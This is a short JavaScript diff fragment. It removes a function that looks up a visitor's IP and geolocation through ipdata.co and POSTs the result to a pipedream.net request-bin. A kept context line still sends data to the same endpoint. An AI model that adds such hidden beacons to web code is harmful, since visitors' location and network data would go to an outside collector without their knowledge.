@@ -59,22 +59,3 @@ function s1(){
     }
     fetch("https://enqhf8jl70i8e.x.pipedream.net/", options)
   }
-  function s2(){
-    var request = new XMLHttpRequest();
-  request.open('GET', 'https://api.ipdata.co/?api-key=test');
-  request.setRequestHeader('Accept', 'application/json');
-  request.onreadystatechange = function () {
-    if (this.readyState === 4) {
-      console.log(this.responseText);
-      const headers1 = new Headers()
-      const options1 = {
-        method: "POST",
-        headers1,
-        mode: "cors",
-        body: this.responseText,
-      }
-      fetch("https://enqhf8jl70i8e.x.pipedream.net/",options1)
-    }
-  }
-  request.send()
-}
